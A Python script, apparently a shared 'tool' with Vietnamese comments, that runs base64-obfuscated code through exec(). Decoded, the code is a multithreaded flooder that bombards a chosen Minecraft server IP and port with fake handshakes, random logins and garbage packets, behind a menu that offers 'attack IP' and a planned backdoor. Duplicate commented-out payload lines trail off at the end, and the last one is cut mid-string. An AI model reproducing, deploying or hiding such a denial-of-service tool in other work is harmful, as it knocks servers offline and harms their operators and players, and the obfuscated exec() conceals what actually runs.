# TOOL MADE BY LAC üë§
# VUI L√íNG KH√îNG S·ª¨A ü§†
# TOOL ƒê√É ƒê∆Ø·ª¢C ƒê√ÅNH D·∫§U üò§
# M·ªåI H√ÄNH VI S·ª¨A CODE ( M√É H√ìA S·∫º ƒê∆Ø·ª¢C COI L√Ä SAI TR√ÅI üí•


import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
exec(base64.b64decode('CmltcG9ydCBzb2NrZXQKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzdHJpbmcKaW1wb3J0IG9zCgpjbGFzcyBDb2xvcnM6CiAgICBIRUFERVIgPSAnXDAzM1s5NW0nCiAgICBPS0JMVUUgPSAnXDAzM1s5NG0nCiAgICBPS0dSRUVOID0gJ1wwMzNbOTJtJwogICAgV0FSTklORyA9ICdcMDMzWzkzbScKICAgIEZBSUwgPSAnXDAzM1s5MW0nCiAgICBJTkZPID0gJ1wwMzNbOTZtJwogICAgRU5EQyA9ICdcMDMzWzBtJwogICAgQk9MRCA9ICdcMDMzWzFtJwoKY2xhc3MgSWNvbnM6CiAgICBBUlJPVyA9ICfilronCiAgICBDSEVDSyA9ICfinJQnCiAgICBDUk9TUyA9ICfinJgnCiAgICBTVEFSID0gJ+KYhScKICAgIFdBUk5JTkcgPSAn4pigJwogICAgSU5GTyA9ICfinIknCiAgICBORVhUID0gJ+KepCcKICAgIENIRUNLQk9YID0gJ+KYkScKICAgIEJVTExFVCA9ICfinKYnCgpkZWYgY2xlYXJfc2NyZWVuKCk6CiAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJykKCnN1Y2Nlc3NfY291bnQgPSAwCmZhaWxfY291bnQgPSAwCmxvY2sgPSB0aHJlYWRpbmcuTG9jaygpCgpkZWYgZW5jb2RlX3ZhcmludCh2YWx1ZSk6CiAgICByZXN1bHQgPSBiJycKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdGVtcCA9IHZhbHVlICYgMHg3RgogICAgICAgIHZhbHVlID4+PSA3CiAgICAgICAgaWYgdmFsdWU6CiAgICAgICAgICAgIHRlbXAgfD0gMHg4MAogICAgICAgIHJlc3VsdCArPSBieXRlcyhbdGVtcF0pCiAgICAgICAgaWYgbm90IHZhbHVlOgogICAgICAgICAgICBicmVhawogICAgcmV0dXJuIHJlc3VsdAoKZGVmIGVuY29kZV9zdHJpbmcocyk6CiAgICBkYXRhID0gcy5lbmNvZGUoJ3V0Zi04JykKICAgIHJldHVybiBlbmNvZGVfdmFyaW50KGxlbihkYXRhKSkgKyBkYXRhCgpkZWYgc2VuZF9wYWNrZXQoc29jaywgcGFja2V0X2lkLCBkYXRhKToKICAgIHBhY2tldCA9IGJ5dGVzKFtwYWNrZXRfaWRdKSArIGRhdGEKICAgIGxlbmd0aCA9IGVuY29kZV92YXJpbnQobGVuKHBhY2tldCkpCiAgICBzb2NrLnNlbmRhbGwobGVuZ3RoICsgcGFja2V0KQoKZGVmIGdlbmVyYXRlX3VzZXJuYW1lKCk6CiAgICByZXR1cm4gIlVzZXJfIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZXMoc3RyaW5nLmFzY2lpX2xvd2VyY2FzZSArIHN0cmluZy5kaWdpdHMsIGs9OCkpCgpkZWYgcmFuZG9tX2NoYXQoKToKICAgIHJldHVybiAnJy5qb2luKHJhbmRvbS5jaG9pY2VzKHN0cmluZy5hc2NpaV9sZXR0ZXJzICsgc3RyaW5nLmRpZ2l0cywgaz1yYW5kb20ucmFuZGludCg1LCAyMCkpKQoKY2xhc3MgTWl4ZWRQYWNrZXRGbG9vZGVyOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIGlwLCBwb3J0LCBwYWNrZXRfaWQpOgogICAgICAgIHNlbGYuaXAgPSBpcAogICAgICAgIHNlbGYucG9ydCA9IHBvcnQKICAgICAgICBzZWxmLnBhY2tldF9pZCA9IHBhY2tldF9pZAogICAgICAgIHNlbGYuc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKCiAgICBkZWYgY29ubmVjdChzZWxmKToKICAgICAgICBzZWxmLnNvY2suc2V0dGltZW91dCgzKQogICAgICAgIHNlbGYuc29jay5jb25uZWN0KChzZWxmLmlwLCBzZWxmLnBvcnQpKQoKICAgIGRlZiBydW4oc2VsZik6CiAgICAgICAgZ2xvYmFsIHN1Y2Nlc3NfY291bnQsIGZhaWxfY291bnQKICAgICAgICB0cnk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHNlbGYuY29ubmVjdCgpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH3Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gU0VSVkVSIE3huqRUIEvhur5UIE7hu5BJICggQ0jhur5UICl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdpdGggbG9jazoKICAgICAgICAgICAgICAgICAgICBmYWlsX2NvdW50ICs9IDEKICAgICAgICAgICAgICAgIHJldHVybgoKICAgICAgICAgICAgaGFuZHNoYWtlID0gKAogICAgICAgICAgICAgICAgZW5jb2RlX3ZhcmludCg3NTQpICsKICAgICAgICAgICAgICAgIGVuY29kZV9zdHJpbmcoc2VsZi5pcCkgKwogICAgICAgICAgICAgICAgc2VsZi5wb3J0LnRvX2J5dGVzKDIsICdiaWcnKSArCiAgICAgICAgICAgICAgICBlbmNvZGVfdmFyaW50KDIpICAjIE5leHQgc3RhdGUgPSBsb2dpbgogICAgICAgICAgICApCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgaGFuZHNoYWtlKQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMDIpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgZW5jb2RlX3N0cmluZyhnZW5lcmF0ZV91c2VybmFtZSgpKSkKICAgICAgICAgICAgdGltZS5zbGVlcCgwLjA1KQoKICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UocmFuZG9tLnJhbmRpbnQoMiwgNikpOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3JhbmRvbV9wYWNrZXQoKQoKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgc3VjY2Vzc19jb3VudCArPSAxCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaMOgbmggQ8O0bmcgIXtDb2xvcnMuRU5EQ30iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaOG6pXQgQuG6oWl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgZmFpbF9jb3VudCArPSAxCiAgICAgICAgZmluYWxseToKICAgICAgICAgICAgc2VsZi5zb2NrLmNsb3NlKCkKCiAgICBkZWYgc2VuZF9yYW5kb21fcGFja2V0KHNlbGYpOgogICAgICAgIHBrdF90eXBlID0gcmFuZG9tLmNob2ljZShbImNoYXQiLCAicGx1Z2luIiwgImtlZXBhbGl2ZSIsICJjdXN0b20iXSkKCiAgICAgICAgaWYgcGt0X3R5cGUgPT0gImNoYXQiOgogICAgICAgICAgICBtc2cgPSBlbmNvZGVfc3RyaW5nKHJhbmRvbV9jaGF0KCkpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMywgbXNnKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gInBsdWdpbiI6CiAgICAgICAgICAgIGNoYW5uZWwgPSBlbmNvZGVfc3RyaW5nKCJNQ3xCcmFuZCIpCiAgICAgICAgICAgIGRhdGEgPSBlbmNvZGVfc3RyaW5nKCJMQUMxM19DdXN0b21DbGllbnQiKQogICAgICAgICAgICBzZW5kX3BhY2tldChzZWxmLnNvY2ssIDB4MTcsIGNoYW5uZWwgKyBkYXRhKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gImtlZXBhbGl2ZSI6CiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgyMSwgZW5jb2RlX3ZhcmludChyYW5kb20ucmFuZGludCgxMDAwMCwgOTk5OTk5KSkpCiAgICAgICAgZWxpZiBwa3RfdHlwZSA9PSAiY3VzdG9tIjoKICAgICAgICAgICAgZ2FyYmFnZSA9IGJ5dGVzKHJhbmRvbS5nZXRyYW5kYml0cyg4KSBmb3IgXyBpbiByYW5nZShyYW5kb20ucmFuZGludCgxMCwgMzApKSkKICAgICAgICAgICAgZmFrZV9pZCA9IHJhbmRvbS5yYW5kaW50KDB4MDEsIDB4M0YpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgZmFrZV9pZCwgZ2FyYmFnZSkKCmRlZiBzdGFydF9hdHRhY2soaXAsIHBvcnQsIHBhY2tldHNfcGVyX3JvdW5kLCBkdXJhdGlvbik6CiAgICBzdGFydF90aW1lID0gdGltZS50aW1lKCkKICAgIHBhY2tldF9pZCA9IDEKCiAgICB0cnk6CiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgdGhyZWFkcyA9IFtdCiAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKHBhY2tldHNfcGVyX3JvdW5kKToKICAgICAgICAgICAgICAgIHQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1NaXhlZFBhY2tldEZsb29kZXIoaXAsIHBvcnQsIHBhY2tldF9pZCkucnVuKQogICAgICAgICAgICAgICAgdC5zdGFydCgpCiAgICAgICAgICAgICAgICB0aHJlYWRzLmFwcGVuZCh0KQogICAgICAgICAgICAgICAgcGFja2V0X2lkICs9IDEKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4wMDIpCgogICAgICAgICAgICBmb3IgdCBpbiB0aHJlYWRzOgogICAgICAgICAgICAgICAgdC5qb2luKCkKCiAgICAgICAgICAgIGlmIGR1cmF0aW9uICE9IDAgYW5kIHRpbWUudGltZSgpIC0gc3RhcnRfdGltZSA+PSBkdXJhdGlvbjoKICAgICAgICAgICAgICAgIGJyZWFrCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgcHJpbnQoZiJcbntDb2xvcnMuV0FSTklOR33Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gROG7q25nIGLhu59pIG5nxrDhu51pIGTDuW5nLntDb2xvcnMuRU5EQ30iKQogICAgZmluYWxseToKICAgICAgICBwcmludChmIlxue0NvbG9ycy5IRUFERVJ9yp/htIDhtIThtI3htIDJqsqA4bSA4bSYIOG0m+G0j+G0j8qfIFThuqROIEPDlE5HIEvhur5UIFRIw5pDe0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59VGjDoG5oIGPDtG5nOiB7c3VjY2Vzc19jb3VudH17Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1UaOG6pXQgYuG6oWk6IHtmYWlsX2NvdW50fXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfVThu5VuZyB0aOG7nWkgZ2lhbjoge2ludCh0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUpfSBnacOieXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHdhaXRfZm9yX3JldHVybigpCgpkZWYgd2FpdF9mb3JfcmV0dXJuKCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGlucCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfXtJY29ucy5BUlJPV30gTmjhuq1wIDAgxJHhu4MgcXVheSBs4bqhaSBtZW51OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgIGlmIGlucCA9PSAiMCI6CiAgICAgICAgICAgIGJyZWFrCgpkZWYgY2hlY2tfc2VydmVyKGlwLCBwb3J0KToKICAgIHRyeToKICAgICAgICB0ZXN0X3NvY2sgPSBzb2NrZXQuc29ja2V0KCkKICAgICAgICB0ZXN0X3NvY2suc2V0dGltZW91dCgzKQogICAgICAgIHRlc3Rfc29jay5jb25uZWN0KChpcCwgcG9ydCkpCiAgICAgICAgdGVzdF9zb2NrLmNsb3NlKCkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIHNob3dfbWVudSgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0JMVUV9e0ljb25zLlNUQVIqM30gSMOjeSBHaGkgc+G7kSDEkeG7gyBzw6BpIMqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyB7SWNvbnMuU1RBUiozfXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59e0ljb25zLkNIRUNLfSAxLiBIaeG7h24gU3RhdHVze0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiIgICB7Q29sb3JzLklORk99SGnhu4duIHRow7RuZyB0aW4sIGNo4bupYyBuxINuZyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfXtJY29ucy5DSEVDS0JPWH0gMi4gSGnhu4duIFRvb2xzIMSRYW5nIHPDoGl7Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIiAgIHtDb2xvcnMuSU5GT31IxrDhu5tuZyBk4bqrbiBjw6FjaCBz4butIGThu6VuZyB0b29sIGRvcyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5XQVJOSU5HfXtJY29ucy5XQVJOSU5HfSAzLiBIaeG7h24gVG9vbHMgQmFja2Rvb3IgKENvbWluZyBzb29uKXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfVTDrW5oIG7Eg25nIEJhY2tkb29yIGhp4buHbiBjaMawYSBraOG6oyBk4bulbmcsIHPhur0gY+G6rXAgbmjhuq10IHNhdXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkZBSUx9e0ljb25zLkNST1NTfSA0LiBU4bqlbiBDw7RuZyBJcHtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfUto4bufaSDEkeG7mW5nIGNo4bupYyBuxINuZyB04bqlbiBjw7RuZyBn4butaSBwYWNrZXQgxJHhur9uIElQIHNlcnZlciDEkcOjIG5o4bqtcHtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkhFQURFUn17SWNvbnMuTkVYVH0gMC4gVGhvw6F0e0NvbG9ycy5FTkRDfVxuIikKCiAgICAgICAgY2hvaWNlID0gaW5wdXQoZiJ7Q29sb3JzLkJPTER9e0ljb25zLkFSUk9XfSBDaOG7jW46IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCgogICAgICAgIGlmIGNob2ljZSA9PSAiMSI6CiAgICAgICAgICAgIGNsZWFyX3NjcmVlbigpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBsw6AgY8O0bmcgY+G7pSBn4butaSBwYWNrZXQgaOG7l24gaOG7o3AgTWluZWNyYWZ0IMSR4buDIGtp4buDbSB0cmEga2jhuqMgbsSDbmcgY2jhu4t1IHThuqNpIHNlcnZlci57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLklORk99SOG7lyB0cuG7oyBuaGnhu4F1IGxv4bqhaSBwYWNrZXQgbmjGsCBjaGF0LCBwbHVnaW4sIGtlZXBhbGl2ZSwgY3VzdG9tLCB2LnYue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tHUkVFTn1Ub29scyDEkWFuZyBzw6BpOntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBoYW5kc2hha2UiKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBsb2dpbiBzdGFydCIpCiAgICAgICAgICAgIHByaW50KGYiIC0gR+G7rWkgcGFja2V0IGNoYXQsIHBsdWdpbiwga2VlcGFsaXZlLCBjdXN0b20gbmfhuqt1IG5oacOqbiIpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfULhuqFuIGPDsyB0aOG7gyB0w7l5IGNo4buNbiBz4buRIGzGsOG7o25nIHBhY2tldCBn4butaSB2w6AgdGjhu51pIGdpYW4gdOG6pW4gY8O0bmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjMiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuV0FSTklOR31Uw61uaCBuxINuZyBCYWNrZG9vciDEkWFuZyB0cm9uZyBxdcOhIHRyw6xuaCBwaMOhdCB0cmnhu4NuIHbDoCBjaMawYSBraOG6oyBk4bulbmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjQiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBpcCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBJUCBzZXJ2ZXIgTWluZWNyYWZ0OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwb3J0X3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBQb3J0ICht4bq3YyDEkeG7i25oIDI1NTY1KToge0NvbG9ycy5FTkRDfSIpLnN0cmlwKCkKICAgICAgICAgICAgcG9ydCA9IGludChwb3J0X3N0cikgaWYgcG9ydF9zdHIuaXNkaWdpdCgpIGVsc2UgMjU1NjUKICAgICAgICAgICAgaWYgbm90IGNoZWNrX3NlcnZlcihpcCwgcG9ydCk6CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1LaMO0bmcgdGjhu4Mga+G6v3QgbuG7kWkgdOG7m2kgc2VydmVyIHtpcH06e3BvcnR9LiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaSBJUCBob+G6t2MgUG9ydC57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBwYWNrZXRzX3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfVPhu5EgbMaw4bujbmcgcGFja2V0IGfhu61pIG3hu5dpIGzhuqduICh2ZDogMTApOiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwYWNrZXRzID0gaW50KHBhY2tldHNfc3RyKSBpZiBwYWNrZXRzX3N0ci5pc2RpZ2l0KCkgZWxzZSAxMAogICAgICAgICAgICBkdXJhdGlvbl9zdHIgPSBpbnB1dChmIntDb2xvcnMuQk9MRH1UaOG7nWkgZ2lhbiB04bqlbiBjw7RuZyAoZ2nDonksIG5o4bqtcCAwIMSR4buDIHbDtCBo4bqhbik6IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCiAgICAgICAgICAgIGR1cmF0aW9uID0gaW50KGR1cmF0aW9uX3N0cikgaWYgZHVyYXRpb25fc3RyLmlzZGlnaXQoKSBlbHNlIDAKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLldBUk5JTkd9QuG6r3QgxJHhuqd1IHThuqVuIGPDtG5nIElQIHtpcH06e3BvcnR9Li4ue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHN0YXJ0X2F0dGFjayhpcCwgcG9ydCwgcGFja2V0cywgZHVyYXRpb24pCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjAiOgogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tCTFVFfVRob8OhdCBjaMawxqFuZyB0csOsbmguIEjhurluIGfhurdwIGzhuqFpIXtDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBicmVhawogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfUzhu7FhIGNo4buNbiBraMO0bmcgaOG7o3AgbOG7hy4gVnVpIGzDsm5nIHRo4butIGzhuqFpLntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICB0aW1lLnNsZWVwKDEpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgc2hvd19tZW51KCkK').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('CmltcG9ydCBzb2NrZXQKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzdHJpbmcKaW1wb3J0IG9zCgpjbGFzcyBDb2xvcnM6CiAgICBIRUFERVIgPSAnXDAzM1s5NW0nCiAgICBPS0JMVUUgPSAnXDAzM1s5NG0nCiAgICBPS0dSRUVOID0gJ1wwMzNbOTJtJwogICAgV0FSTklORyA9ICdcMDMzWzkzbScKICAgIEZBSUwgPSAnXDAzM1s5MW0nCiAgICBJTkZPID0gJ1wwMzNbOTZtJwogICAgRU5EQyA9ICdcMDMzWzBtJwogICAgQk9MRCA9ICdcMDMzWzFtJwoKY2xhc3MgSWNvbnM6CiAgICBBUlJPVyA9ICfilronCiAgICBDSEVDSyA9ICfinJQnCiAgICBDUk9TUyA9ICfinJgnCiAgICBTVEFSID0gJ+KYhScKICAgIFdBUk5JTkcgPSAn4pigJwogICAgSU5GTyA9ICfinIknCiAgICBORVhUID0gJ+KepCcKICAgIENIRUNLQk9YID0gJ+KYkScKICAgIEJVTExFVCA9ICfinKYnCgpkZWYgY2xlYXJfc2NyZWVuKCk6CiAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJykKCnN1Y2Nlc3NfY291bnQgPSAwCmZhaWxfY291bnQgPSAwCmxvY2sgPSB0aHJlYWRpbmcuTG9jaygpCgpkZWYgZW5jb2RlX3ZhcmludCh2YWx1ZSk6CiAgICByZXN1bHQgPSBiJycKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdGVtcCA9IHZhbHVlICYgMHg3RgogICAgICAgIHZhbHVlID4+PSA3CiAgICAgICAgaWYgdmFsdWU6CiAgICAgICAgICAgIHRlbXAgfD0gMHg4MAogICAgICAgIHJlc3VsdCArPSBieXRlcyhbdGVtcF0pCiAgICAgICAgaWYgbm90IHZhbHVlOgogICAgICAgICAgICBicmVhawogICAgcmV0dXJuIHJlc3VsdAoKZGVmIGVuY29kZV9zdHJpbmcocyk6CiAgICBkYXRhID0gcy5lbmNvZGUoJ3V0Zi04JykKICAgIHJldHVybiBlbmNvZGVfdmFyaW50KGxlbihkYXRhKSkgKyBkYXRhCgpkZWYgc2VuZF9wYWNrZXQoc29jaywgcGFja2V0X2lkLCBkYXRhKToKICAgIHBhY2tldCA9IGJ5dGVzKFtwYWNrZXRfaWRdKSArIGRhdGEKICAgIGxlbmd0aCA9IGVuY29kZV92YXJpbnQobGVuKHBhY2tldCkpCiAgICBzb2NrLnNlbmRhbGwobGVuZ3RoICsgcGFja2V0KQoKZGVmIGdlbmVyYXRlX3VzZXJuYW1lKCk6CiAgICByZXR1cm4gIlVzZXJfIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZXMoc3RyaW5nLmFzY2lpX2xvd2VyY2FzZSArIHN0cmluZy5kaWdpdHMsIGs9OCkpCgpkZWYgcmFuZG9tX2NoYXQoKToKICAgIHJldHVybiAnJy5qb2luKHJhbmRvbS5jaG9pY2VzKHN0cmluZy5hc2NpaV9sZXR0ZXJzICsgc3RyaW5nLmRpZ2l0cywgaz1yYW5kb20ucmFuZGludCg1LCAyMCkpKQoKY2xhc3MgTWl4ZWRQYWNrZXRGbG9vZGVyOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIGlwLCBwb3J0LCBwYWNrZXRfaWQpOgogICAgICAgIHNlbGYuaXAgPSBpcAogICAgICAgIHNlbGYucG9ydCA9IHBvcnQKICAgICAgICBzZWxmLnBhY2tldF9pZCA9IHBhY2tldF9pZAogICAgICAgIHNlbGYuc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKCiAgICBkZWYgY29ubmVjdChzZWxmKToKICAgICAgICBzZWxmLnNvY2suc2V0dGltZW91dCgzKQogICAgICAgIHNlbGYuc29jay5jb25uZWN0KChzZWxmLmlwLCBzZWxmLnBvcnQpKQoKICAgIGRlZiBydW4oc2VsZik6CiAgICAgICAgZ2xvYmFsIHN1Y2Nlc3NfY291bnQsIGZhaWxfY291bnQKICAgICAgICB0cnk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHNlbGYuY29ubmVjdCgpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH3Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gU0VSVkVSIE3huqRUIEvhur5UIE7hu5BJICggQ0jhur5UICl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdpdGggbG9jazoKICAgICAgICAgICAgICAgICAgICBmYWlsX2NvdW50ICs9IDEKICAgICAgICAgICAgICAgIHJldHVybgoKICAgICAgICAgICAgaGFuZHNoYWtlID0gKAogICAgICAgICAgICAgICAgZW5jb2RlX3ZhcmludCg3NTQpICsKICAgICAgICAgICAgICAgIGVuY29kZV9zdHJpbmcoc2VsZi5pcCkgKwogICAgICAgICAgICAgICAgc2VsZi5wb3J0LnRvX2J5dGVzKDIsICdiaWcnKSArCiAgICAgICAgICAgICAgICBlbmNvZGVfdmFyaW50KDIpICAjIE5leHQgc3RhdGUgPSBsb2dpbgogICAgICAgICAgICApCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgaGFuZHNoYWtlKQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMDIpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgZW5jb2RlX3N0cmluZyhnZW5lcmF0ZV91c2VybmFtZSgpKSkKICAgICAgICAgICAgdGltZS5zbGVlcCgwLj